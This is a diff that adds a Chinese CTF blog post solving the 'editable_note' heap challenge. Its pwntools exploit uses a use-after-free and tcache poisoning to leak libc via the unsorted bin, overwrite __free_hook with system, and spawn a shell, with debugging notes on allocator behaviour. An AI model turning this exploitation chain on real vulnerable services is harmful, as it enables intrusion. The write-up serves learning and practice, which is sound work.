@@ -214,6 +214,136 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/12/03/editable_note/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/tou.jpg">
+      <meta itemprop="name" content="rjc">
+      <meta itemprop="description" content="pangpangpang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mvegetable'blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/12/03/editable_note/" class="post-title-link" itemprop="url">editable_note</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-12-03 22:30:32 / 修改时间：22:30:46" itemprop="dateCreated datePublished" datetime="2025-12-03T22:30:32+08:00">2025-12-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.5k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h1><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203210748426.png" alt="image-20251203210748426"></p>
+<p>艾我也喜欢攻破靶机的感觉。</p>
+<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu:"></a>menu:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203210953023.png"></p>
+<h3 id="add"><a href="#add" class="headerlink" title="add:"></a>add:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211025974.png" alt="image-20251203211025974"></p>
+<h3 id="delete"><a href="#delete" class="headerlink" title="delete:"></a>delete:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211056868.png" alt="image-20251203211056868"></p>
+<h3 id="edit"><a href="#edit" class="headerlink" title="edit:"></a>edit:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211153251.png" alt="image-20251203211153251"></p>
+<h3 id="show"><a href="#show" class="headerlink" title="show:"></a>show:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211227251.png" alt="image-20251203211227251"></p>
+<p><strong>这个题是典型的<code>uaf </code>+ <code>tache posioning</code></strong></p>
+<h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc:"></a>泄露<code>libc</code>:</h3><p>通过<code>unsorted bin</code>泄露<code>main_arena</code>进而泄露<code>Libc</code></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">p = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.anna.nssctf.cn&quot;,25397)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">leng,color</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(leng))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(color))</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">id1</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1))	</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">id1</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1))	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">id1,name</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1))	</span><br><span class="line">	p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>) // 防止于top chunk合并</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;main_arena: <span class="subst">&#123;<span class="built_in">hex</span>(main_arena)&#125;</span>&quot;</span>)</span><br><span class="line">libcbase = main_arena - <span class="number">0x1ecbe0</span></span><br><span class="line">log.success(<span class="string">f&quot;libcbase: <span class="subst">&#123;<span class="built_in">hex</span>(libcbase)&#125;</span>&quot;</span>)</span><br><span class="line">free_hook = libcbase + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;libcbase: <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;libcbase: <span class="subst">&#123;<span class="built_in">hex</span>(free_hook)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里先申请8个同样大小的chunk 七个用来填满<code>tache bin</code>  另一个用来释放进入<code>unsorted bin </code> </p>
+<p>可以看到<code>chunk7</code> 的fd和bk都指向<code>main_arena</code></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203212520431.png" alt="image-20251203212520431"></p>
+<h4 id="🐖："><a href="#🐖：" class="headerlink" title="🐖："></a>🐖：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>) // 防止于top chunk合并</span><br></pre></td></tr></table></figure>
+
+<p> 最开始做的时候没有加这个</p>
+<p>导致这个chunk 释放后会和top chunk合并 而不是进入unsorted bin::</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#add(8,0x20)</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203213410982.png" alt="image-20251203213410982"></p>
+<p>可以看到没有进入ub 且top chunk的地址发生了变化。</p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203213429481.png" alt="image-20251203213429481"></p>
+<h4 id="🐖：-1"><a href="#🐖：-1" class="headerlink" title="🐖："></a>🐖：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">8</span>) <span class="comment">###try</span></span><br></pre></td></tr></table></figure>
+
+<p>这里好奇尝试了一下释放这个chunk8 但是他没有和top chunk合并。因为进入<code>tache </code>的优先级高于top chunk 合并</p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203213842185.png" alt="image-20251203213842185"></p>
+<h3 id="uaf-posioning"><a href="#uaf-posioning" class="headerlink" title="uaf + posioning:"></a>uaf + <code>posioning</code>:</h3><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">9</span>,<span class="number">0x20</span>)  /// </span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x20</span>) ///</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">9</span>,p64(free_hook))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>有点像double free</p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203221329698.png" alt="image-20251203221329698"></p>
+<p>这里的<code>0x690</code>是chunk9 <code>0x720</code>是chunk8</p>
+<p><code>tache</code>是 LIFO（后进先出）</p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222111156.png" alt="image-20251203222111156"></p>
+<p>chunk9相当于头指针 chunk8是尾指针</p>
+<p>这里修改<code>chunk9</code>的next指针就可以劫持<code>tahce</code></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203221237988.png" alt="image-20251203221237988"></p>
+<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x20</span>) // __free_hook</span><br><span class="line">edit(<span class="number">12</span>,p64(system))</span><br><span class="line">dele(<span class="number">10</span>) //触发system(/<span class="built_in">bin</span>/sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这样就打通了。</p>
+<h4 id="🐖：-2"><a href="#🐖：-2" class="headerlink" title="🐖："></a>🐖：</h4><p>在调试的时候发现重新申请chunk的时候会优先用unsortedbin部分的chunk</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">9</span>,<span class="number">0x20</span>)    ///<span class="number">1</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)   ///<span class="number">2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x20</span>)   ///<span class="number">3</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>初始状态：</p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222607081.png" alt="image-20251203222607081"></p>
+<h5 id="1"><a href="#1" class="headerlink" title="1:"></a>1:</h5><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222709430.png" alt="image-20251203222709430"></p>
+<h5 id="2"><a href="#2" class="headerlink" title="2:"></a>2:</h5><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222723903.png" alt="image-20251203222723903"></p>
+<p>可以看到<code>glibc</code>优先分配的是<code>unsortedbin</code>中的chunk</p>
+<h5 id="3"><a href="#3" class="headerlink" title="3:"></a>3:</h5><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222735752.png" alt="image-20251203222735752"></p>
+<p><code>unsortedbin</code>分配完后 会从top chunk中分割。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/12/01/unlink/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1268,7 +1398,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
